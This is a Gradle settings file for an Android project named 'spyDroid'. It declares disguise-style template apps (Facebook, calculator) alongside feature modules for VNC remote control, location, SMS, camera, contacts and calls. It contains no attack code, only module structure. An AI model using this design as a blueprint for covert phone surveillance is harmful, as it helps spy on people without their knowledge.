/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}

//templates app
include(":app")

//system
//include(":core-ui")

//project
rootProject.name = "spyDroid"


include(":features")
include(":features:vnc")
include(":manager-features")
include(":templates")
include(":templates:sample")
include(":templates:sample:app")
include(":common")
include(":templates:facebook")
include(":templates:facebook:app")
include(":templates:default")
include(":templates:default:app")
include(":templates:calculator")
include(":templates:calculator:app")
include(":templates:facebook:core-ui")
include(":features:location")
include(":features:sms")
include(":features:sharedata")
include(":features:multimedia")
include(":features:camera")
include(":features:contacts")
include(":features:calls")
include(":templates:default:core-data")
include(":templates:default:core-database")
